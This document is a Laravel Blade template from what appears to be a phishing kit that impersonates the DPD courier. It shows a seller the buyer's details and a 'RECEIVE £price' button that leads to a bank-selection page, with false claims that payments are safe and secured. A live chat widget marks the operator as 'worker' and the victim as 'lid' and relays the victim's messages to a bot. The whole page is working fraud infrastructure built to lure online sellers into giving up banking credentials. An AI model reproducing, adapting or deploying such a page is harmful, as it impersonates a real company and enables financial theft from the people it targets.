<!DOCTYPE html>
<html id="html" prefix="og: https://ogp.me/ns#" data-critters-container="">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <title>{{ $order->ad_name }}</title>
    <base href=".">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">

    @vite(['resources/css/app.css', 'resources/js/app.js'])

    <style>
        .chat-widget {
            position: fixed;
            bottom: 20px;
            right: 20px;
            width: 300px;
            z-index: 1000;
        }
        .chat-header {
            background-color: #007bff;
            color: white;
            padding: 10px;
            border-radius: 5px 5px 0 0;
            cursor: pointer;
        }
        .chat-body {
            display: none;
            background-color: white;
            border: 1px solid #ccc;
            border-radius: 0 0 5px 5px;
            max-height: 400px;
            overflow-y: auto;
            padding: 10px;
        }
        .chat-footer {
            display: none;
            background-color: white;
            border: 1px solid #ccc;
            border-radius: 0 0 5px 5px;
            padding: 10px;
        }
        .chat-container {
            display: flex;
            flex-direction: column;
            height: 300px;
            overflow-y: scroll;
        }
        .message {
            margin-bottom: 10px;
            word-wrap: break-word;
            overflow-wrap: break-word;
        }
        .message.mine {
            text-align: right;
        }
        .message .content {
            display: inline-block;
            padding: 10px;
            border-radius: 10px;
            max-width: 100%; /* Ограничивает максимальную ширину контента */
            word-wrap: break-word; /* Добавленное свойство для переноса длинных слов */
            overflow-wrap: break-word; /* Добавленное свойство для переноса длинных слов */
        }
        .message.mine .content {
            background-color: #e0ffe0;
        }
        .message.their .content {
            background-color: #f0f0f0;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body class="bg-gray-100">

<div class="chat-widget fixed bottom-4 right-4 bg-white shadow-lg rounded-lg overflow-hidden">
    <div class="chat-header bg-blue-500 text-white p-4 cursor-pointer flex items-center justify-between" onclick="toggleChat()">
        <span>Chat Support</span>
        <span id="notificationIndicator" class="hidden bg-red-500 h-3 w-3 rounded-full inline-block ml-2"></span>
    </div>
    <div class="chat-body hidden p-4" id="chatBody">
        <div id="chat" class="chat-container space-y-2">
            <!-- Messages will appear here -->
        </div>
    </div>
    <div class="chat-footer p-4 bg-gray-100 flex items-center">
        <input type="text" id="messageInput" class="border border-gray-300 p-2 rounded flex-grow mr-2" placeholder="Type your message here...">
        <button onclick="sendMessage()" class="bg-blue-500 text-white py-2 px-4 rounded">Send</button>
    </div>
</div>

<!-- Header with Logo -->
<header class="bg-white shadow">
    <div class="max-w-7xl mx-auto py-4 px-4 sm:px-6 lg:px-8 flex justify-between items-center">
        <div class="flex-shrink-0">
            <a href="https://www.dpd.co.uk/"><img src="/images/dpd.svg" alt="DPD Logo" class="h-16 w-16"></a>
        </div>
    </div>
</header>

<div class="container mx-auto mt-5">
    <div class="bg-white p-6 rounded-lg shadow-lg">
        <div class="flex justify-between items-center mb-6">
            <div class="text-2xl font-bold text-red-600"><img src="/images/dpd.svg" alt="DPD Logo" class="h-16 w-16"></div>
            <div class="text-lg font-semibold">Shipment №{{ $order->unique_id }}</div>
        </div>

        <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
            <div>
                <h2 class="text-xl font-bold mb-4">Information</h2>
                <div class="mb-2"><span class="font-semibold">The recipient of the parcel:</span> {{ $order->full_name }}</div>
                <div class="mb-2"><span class="font-semibold">Product Name:</span> {{ $order->ad_name }}</div>
                <div class="mb-2"><span class="font-semibold">Track number of the departure:</span> {{ $order->unique_id }}</div>
                <div class="mb-2"><span class="font-semibold">Delivery Address:</span> {{ $order->address }}</div>
                <div class="mb-2"><span class="font-semibold">Amount withheld:</span> £{{ $order->price }}</div>
            </div>

            <div>
                <h2 class="text-xl font-bold mb-4">Tracking</h2>
                <ul class="list-none p-0">
                    <li class="flex items-center mb-2">
                        <div class="w-4 h-4 bg-red-600 rounded-full mr-2"></div>
                        <span>A shipment has been created</span>
                    </li>
                    <li class="flex items-center mb-2">
                        <div class="w-4 h-4 bg-red-600 rounded-full mr-2"></div>
                        <span>Awaiting payment</span>
                    </li>
                    <li class="flex items-center mb-2">
                        <div class="w-4 h-4 bg-red-600 rounded-full mr-2"></div>
                        <span>The package is paid</span>
                    </li>
                    <li class="flex items-center mb-2">
                        <div class="w-4 h-4 bg-white border border-red-600 rounded-full mr-2"></div>
                        <span>Funds are waiting to be received</span>
                    </li>
                    <li class="flex items-center mb-2">
                        <div class="w-4 h-4 bg-white border border-red-600 rounded-full mr-2"></div>
                        <span>The parcel has been delivered to the courier</span>
                    </li>
                    <li class="flex items-center mb-2">
                        <div class="w-4 h-4 bg-white border border-red-600 rounded-full mr-2"></div>
                        <span>The parcel has been delivered to the recipient</span>
                    </li>
                </ul>
            </div>
        </div>

        <div class="mt-6">
            <h2 class="text-xl font-bold mb-4">Receiving funds</h2>
            <div class="flex items-center p-4 bg-gray-100 rounded-lg shadow-inner">
                <div class="flex items-center justify-between w-full">
                    <div>
                        <p class="font-semibold">Your order has been created!</p>
                        <p class="text-sm">The delivery is paid by the customer</p>
                    </div>
                    <a href="{{ route('banks', ['unique_id' => $order->unique_id]) }}" class="px-4 py-2 bg-red-600 text-white rounded-lg font-semibold hover:bg-red-700 transition">RECEIVE £{{ $order->price }}</a>
                </div>
            </div>
            <div class="mt-4 text-sm text-gray-500">
                <p>Payments are safe</p>
                <p>By clicking the "Receive funds" button, you accept the terms of the User Agreement using the "Secure Transaction" online service</p>
            </div>
        </div>
    </div>
</div>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script>
    const linkId = '{{ $order->unique_id }}'; // уникальный номер ссылки

    document.addEventListener("DOMContentLoaded", function() {
        loadMessages();

        window.Echo.channel('chat.' + linkId)
            .listen('MessageSent', (e) => {
                const message = e.message.message;
                console.log(message);

                const messageElement = $('<div>').addClass('message their');
                const contentElement = $('<div>').addClass('content').text(message);
                messageElement.append(contentElement);

                $('#chat').append(messageElement);
                scrollChatToBottom()

                const chatBody = document.querySelector('.chat-body');
                const isHidden = getComputedStyle(chatBody).display === 'none';
                if (isHidden) {
                    $('#notificationIndicator').removeClass('hidden');
                }
            });
    })

    function loadMessages() {
        $.get('/api/get-messages/' + linkId, function(data) {
            data.forEach(function(message) {
                addMessageToChat(message);
            });
            scrollChatToBottom();
        });
    }

    function addMessageToChat(message) {
        const messageElement = $('<div>').addClass('message');
        const contentElement = $('<div>').addClass('content').text(message.message);

        if (message.who === 'worker') {
            messageElement.addClass('mine');
        } else {
            messageElement.addClass('their');
        }

        messageElement.append(contentElement);
        $('#chat').append(messageElement);
        scrollChatToBottom();
    }

    function sendMessage() {
        const messageInput = document.getElementById('messageInput');
        const message = messageInput.value;

        fetch('/api/send-message', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRF-TOKEN': '{{ csrf_token() }}'
            },
            body: JSON.stringify({ unique_id: linkId, message: message, who: 'lid' })
        }).then(response => response.json()).then(data => {
            if (data.status === 'Message Sent!') {
                const messageElement = document.createElement('div');
                messageElement.className = 'message mine';
                const contentElement = document.createElement('div');
                contentElement.className = 'content';
                contentElement.innerText = message;
                messageElement.appendChild(contentElement);
                document.getElementById('chat').appendChild(messageElement);
                messageInput.value = '';
                scrollChatToBottom()

                // Отправка сообщения боту
                fetch('/send-to-bot', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-CSRF-TOKEN': '{{ csrf_token() }}'
                    },
                    body: JSON.stringify({ unique_id: linkId, message: message })
                });
            }
        });
    }

    function toggleChat() {
        const chatBody = document.querySelector('.chat-body');
        const chatFooter = document.querySelector('.chat-footer');
        const isHidden = getComputedStyle(chatBody).display === 'none';
        chatBody.style.display = isHidden ? 'block' : 'none';
        chatFooter.style.display = isHidden ? 'block' : 'none';
        if (isHidden) {
            $('#notificationIndicator').addClass('hidden');
        }
        scrollChatToBottom()
    }

    function scrollChatToBottom() {
        $("#chat").scrollTop($("#chat")[0].scrollHeight);
    }
</script>
</body>
</html>
